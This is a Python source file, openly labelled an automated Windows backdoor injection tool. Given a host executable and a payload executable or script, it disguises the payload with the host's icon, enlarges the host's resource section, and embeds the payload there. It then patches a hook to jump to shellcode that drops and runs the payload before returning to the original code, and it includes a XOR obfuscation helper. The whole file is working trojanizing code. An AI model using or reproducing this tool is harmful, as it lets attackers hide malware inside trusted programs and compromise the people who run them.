#!python3
"""Automated Windows backdoor injection tool."""
import argparse
import magic
import math
import os
import pefile
import shutil
import struct
import subprocess
import sys


class Builder():
    """Various operations used to inject a target PE into a host PE."""

    def __init__(self, host, target, backdoor_loc, shellcode_loc, hook_loc, hook_bytes):
        """Initialise class vars."""
        self.BUNDLE_DIR = "./payload/"
        self.BUILD_DIR = "./dist/"

        self.SHELLCODE_SRC_PATH = "./shellcode.asm"
        self.SHELLCODE_BIN_PATH = "./shellcode.bin"

        self.HOST_PATH = os.path.dirname(host)
        self.HOST_EXE = os.path.basename(host)
        self.BUNDLE_PATH = self.BUNDLE_DIR + os.path.basename(self.HOST_PATH) + os.path.altsep
        self.BUNDLE_EXE = self.BUNDLE_PATH + self.HOST_EXE
        self.BUILD_EXE = self.BUILD_DIR + self.HOST_EXE

        file_type = magic.from_file(target, mime=True)
        # Bundle target if it is a python script
        if file_type == 'text/x-python':
            self.bundle_script(target, host, self.BUILD_DIR)
            self.TARGET_EXE = self.BUILD_DIR + os.path.basename(target).strip('.py') + '.exe'
        # If it isn't a python script or a PE, exit
        elif file_type is not 'application/x-dosexec':
            print("Incorrect filetype of target.")
            sys.exit()
        else:
            self.TARGET_EXE = target

        self.TARGET_SIZE = os.stat(self.TARGET_EXE).st_size

        # Parse addresses
        self.BACKDOOR_LOC = self.parse_value(backdoor_loc)
        self.SHELLCODE_LOC = self.parse_value(shellcode_loc)
        self.HOOK_LOC = self.parse_value(hook_loc)

        self.HOOK_BYTES = hook_bytes

        print(" * Build information:")
        print(" * * HOST_PATH:      {0}".format(self.HOST_PATH))
        print(" * * HOST_EXE:       {0}".format(self.HOST_EXE))
        print(" * * BUNDLE_PATH:    {0}".format(self.BUNDLE_PATH))
        print(" * * BUNDLE_EXE:     {0}".format(self.BUNDLE_EXE))
        print(" * * BUILD_EXE:      {0}".format(self.BUILD_EXE))
        print(" * * TARGET_EXE:     {0}".format(self.TARGET_EXE))
        print(" * * TARGET_SIZE:    {0}".format(self.TARGET_SIZE))
        print(" * * BACKDOOR_LOC:   {0}".format(hex(self.BACKDOOR_LOC)))
        print(" * * SHELLCODE_LOC:  {0}".format(hex(self.SHELLCODE_LOC)))
        print(" * * HOOK_LOC:       {0}".format(hex(self.HOOK_LOC)))
        print(" * * HOOK_BYTES:     {0}".format(self.HOOK_BYTES))
        sys.stdout.flush()

    def parse_value(self, value):
        """Parse addresses in both integer (e.g. '22') and hex-string (e.g. '0x16') formats."""
        # base 16
        if value.startswith("0x"):
            return int(value[2:], 16)
        # base 10
        else:
            return int(value)

    def bundle_script(self, script, host=None, dest='./dist/'):
        """Use PyInstaller to bundle up the specified Python script into a Windows Portable Executable.

        @param script: the Python script to bundle
        @param host: if provided PyInstaller is invoked with the -i argument, which bundles the output executable
                     with the same icon as the host
        @param dest: the path to output the bundle to
        """
        print(" * Bundling python script: {0}".format(script))
        if host is not None:
            print(" * * Bundling with same icon as host PE")
            subprocess.run(['pyinstaller.exe', script, '--log-level', 'ERROR', '--onefile', '-i',
                            host, '--distpath', dest], check=True)
        else:
            subprocess.run(['pyinstaller.exe', '{0}', '--log-level', 'ERROR',
                            '--onefile', '--distpath', '{1}'.format(script, host, dest)], check=True)

    def fixup_shellcode(self):
        """Modify and compile the shellcode source with the correct target size."""
        print(" * Fixing shellcode")
        SHELLCODE_MOD_SRC_PATH = self.SHELLCODE_SRC_PATH + ".mod"
        with open(self.SHELLCODE_SRC_PATH, "r") as src:
            with open(SHELLCODE_MOD_SRC_PATH, 'w') as src_mod:
                line = src.readline()
                while("SIZE_FLAG" not in line):
                    src_mod.write(line)
                    line = src.readline()
                line = src.readline()
                if "push dword " in line:
                    modification = "push dword {0}\n".format(hex(self.TARGET_SIZE))
                    print(" * * Modifying shellcode with: '{0}'".format(modification.strip()))
                    src_mod.write(modification)
                    data = src.read(0x1000)
                    while data:
                        src_mod.write(data)
                        data = src.read(0x1000)
                else:
                    print(" * * Could not find SIZE_FLAG, halting build!")
                    return False

        print(" * Compiling shellcode")
        os.system("nasm {0} -f bin -o {1}".format(SHELLCODE_MOD_SRC_PATH, self.SHELLCODE_BIN_PATH))
        os.remove(SHELLCODE_MOD_SRC_PATH)
        return True

    def backdoor_target(self):
        """Make all required modifications to the host PE to backdoor it with the target PE."""
        print(" * Backdooring target PE: {0}".format(self.BUNDLE_EXE))
        # Wipe away previous deployment
        if os.path.exists(self.BUILD_EXE):
            print(" * * Deleting old build")
            os.remove(self.BUILD_EXE)

        target_pe = pefile.PE(self.BUNDLE_EXE)

        for section in target_pe.sections:
            section_dict = section.dump_dict()
            # Make .text writable (Currently disabled as no shellcode obfuscation taking place)
            # if ".text" in section_dict['Name']['Value']:
            #     print(" * * * Making .text section writable")
            #     section.Characteristics = 0xe0000020

            # Expand .rsrc section
            if ".rsrc" in section_dict['Name']['Value']:
                print(" * * * Modifying size of .rsrc section")

                rsrc_offset_into_pe = section.VirtualAddress
                backdoor_offset_into_rsrc = self.BACKDOOR_LOC - rsrc_offset_into_pe
                # Payload size + offset into resource section
                expanded_rsrc_v_size = self.TARGET_SIZE + backdoor_offset_into_rsrc
                # padding out to 4k
                expanded_rsrc_size = int(expanded_rsrc_v_size +
                                         (1.0 - (expanded_rsrc_v_size / 4096 -
                                                 (math.floor(expanded_rsrc_v_size / 4096)))) * 4096)
                padding_required = expanded_rsrc_size - expanded_rsrc_v_size

                old_rsrc_size = section.SizeOfRawData
                section.SizeOfRawData = expanded_rsrc_size
                section.Misc_VirtualSize = expanded_rsrc_v_size

        # Expand size in optional header
        image_size_difference = expanded_rsrc_size - old_rsrc_size
        target_pe.OPTIONAL_HEADER.SizeOfImage += image_size_difference

        target_pe.write(self.BUILD_EXE)
        target_pe.close()

        # Inject PE at PE_INJECT_LOC
        # Using file as pefile doesn't let us extend past the file border
        print(" * Injecting PE")
        with open(self.BUILD_EXE, 'r+b') as target:
            target.seek(self.BACKDOOR_LOC)
            with open(self.TARGET_EXE, 'rb') as payload:
                data = payload.read(0x1000)
                print(" * * Embedding payload of size: {0}".format(hex(self.TARGET_SIZE)))
                while data:
                    target.write(data)
                    data = payload.read(0x1000)
            # pad out with nulls
            print(" * * Padding out with {0} nulls".format(padding_required))
            target.write(b"\x00" * padding_required)

        print(" * * Hooking execution")
        original_bytes = b''
        with open(self.BUNDLE_EXE, 'r+b') as orig:
            orig.seek(self.HOOK_LOC)
            original_bytes = orig.read(self.HOOK_BYTES)

        # No. of bytes we need to jump to get from the hook to the shellcode
        jmp_dist = self.SHELLCODE_LOC - self.HOOK_LOC
        jmp_instr = self.generate_rel32_jump(jmp_dist)
        # Pad out the rest of the overwrite with nops
        byte_overwrite = jmp_instr + (b"\x90" * (self.HOOK_BYTES - len(jmp_instr)))
        # Where execution needs to be returned to
        return_addr = self.HOOK_LOC + len(byte_overwrite)
        with open(self.BUILD_EXE, 'r+b') as target:
            target.seek(self.HOOK_LOC)
            target.write(byte_overwrite)

        # Add shellcode to drop and execute payload
        print(" * * Adding shellcode")
        with open(self.BUILD_EXE, 'r+b') as target:
            with open(self.SHELLCODE_BIN_PATH, 'rb') as shellcode:
                target.seek(self.SHELLCODE_LOC)
                data = shellcode.read(0x1000)
                while data:
                    target.write(data)
                    data = shellcode.read(0x1000)

            print(" * * Returning execution to original entry point")
            target.write(original_bytes)
            curr_offset = target.tell()
            jmp_dist = return_addr - curr_offset
            jmp_instr = self.generate_rel32_jump(jmp_dist)
            target.write(jmp_instr)
            # pad out end of shellcode with nops
            target.write(b"\x90" * 10)
        print(" * * Backdoor complete")

    def generate_rel32_jump(self, distance):
        """Construct an x86 32-bit relative jump instruction."""
        # No. of bytes required for a 32-bit relative jump instruction
        JMP_REL32_LEN = 5
        JMP_REL32_OPCODE = b"\xE9"
        return JMP_REL32_OPCODE + self.swap32(distance - JMP_REL32_LEN).to_bytes(4, 'big')

    def swap32(self, integer):
        """Convert a big-endian integer to little-endian."""
        return struct.unpack("<I", struct.pack(">i", integer))[0]

    def obfs_xor(self, data, xor_key):
        """Obfuscate data by applying a xor with the xor_key to every byte.

        @param data: data to be obfuscated
        @param xor_key: key to xor each byte with
        """
        xored_data = b''
        for byte in data:
            xored_data += (byte ^ xor_key).to_bytes(1, 'big')
        return xored_data

    def prepare_pe(self):
        """Copy the directory of the host PE along with any files that might be required for operation."""
        print(" * Copying PE directory at: {0}".format(self.HOST_PATH))
        if os.path.exists(self.BUNDLE_PATH):
            print(" * * Deleting old bundle")
            shutil.rmtree(self.BUNDLE_PATH)
        print(" * * Copying...")
        shutil.copytree(self.HOST_PATH, self.BUNDLE_PATH)
        print(" * * Done copying to: {0}".format(self.BUNDLE_PATH))
        sys.stdout.flush()

    def bundle_pe(self):
        """Copy the injected PE from the build directory to the output/bundle directory."""
        print(" * Bundling injected PE with directory".format(self.BUNDLE_PATH))
        shutil.copy(self.BUILD_EXE, self.BUNDLE_PATH)
        print(" * * Done")

if __name__ == "__main__":
    """Mainline."""
    parser = argparse.ArgumentParser(description="Compile and backdoor a specific windows host binary with the \
                                                 specified target binary")
    parser.add_argument("host", type=str, help="portable executable to be backdoored")
    parser.add_argument("target", type=str, help="backdoor executable/python script to inject into host")
    parser.add_argument("backdoor_loc", help="offset to empty space in the target to embed the binary, look for start \
                                             of nulls in last section")
    parser.add_argument("shellcode_loc", help="offset to empty space in a section in the target which is executable. \
                                              i.e. .text")
    parser.add_argument("hook_loc", help="offset to location to hook to shellcode and back.")
    parser.add_argument("hook_bytes", type=int, default=5, help="number of bytes to replace at hook_loc to ensure any \
                                                                copied instructions are not broken up. Must be \
                                                                greater than or equal to the 5 required for the hook.")

    args = parser.parse_args()
    builder = Builder(args.host, args.target, args.backdoor_loc, args.shellcode_loc, args.hook_loc, args.hook_bytes)

    # clean/copy a fresh set of the host directory to the bundle/output directory
    builder.prepare_pe()

    # Modify shellcode with appropriate size and compile
    # TODO: add location fixup (linked to embed location param)
    if not builder.fixup_shellcode():
        print("Build Failed: Problem with shellcode")
        sys.exit()

    # backdoor the target exe
    builder.backdoor_target()

    builder.bundle_pe()

    print("Build Successful. See completed bundle at: {0}".format(builder.BUNDLE_PATH))
